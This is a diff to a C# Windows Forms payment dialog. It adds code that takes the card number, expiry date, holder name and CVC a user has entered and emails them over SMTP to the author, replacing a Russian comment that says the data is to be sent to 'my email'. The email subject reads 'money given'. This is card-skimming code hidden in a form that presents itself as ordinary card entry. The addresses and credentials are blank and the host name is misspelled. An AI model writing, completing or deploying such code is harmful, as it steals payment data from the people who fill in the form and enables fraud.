@@ -1,4 +1,7 @@
 ﻿using System;
+using System.Net;
+using System.Net.Mail;
+using System.Runtime.CompilerServices;
 using System.Text.RegularExpressions;
 using System.Windows.Forms;
 
@@ -56,16 +59,24 @@ namespace BUILD.modules
                     label_message.Text = "неверный cvc/cvv";
                     return;
                 }
+                try
+                {
 
-                
-                /*
-                 
-                 Тут нада
-                 отправка
-                 данных на
-                 мне почту
-                 
-                 */
+                    MailAddress from = new MailAddress("", "BUILD/IS");
+                    MailAddress to = new MailAddress("");
+                    MailMessage message = new MailMessage(from, to);
+                    message.Subject = "деньга дали";
+                    message.Body = $"номер:{num} дата: {date1}/{date2}, держатель: {holder}, cvc:{ccccv}";
+                    SmtpClient client = new SmtpClient("stmp.gmail.com", 587);
+                    client.Credentials = new NetworkCredential("", "");
+                    client.EnableSsl = true;
+                    client.Send(message);
+
+                }
+                catch (Exception exception)
+                {
+                    MessageBox.Show(exception.Message);
+                }
 
                 this.Close();
                 
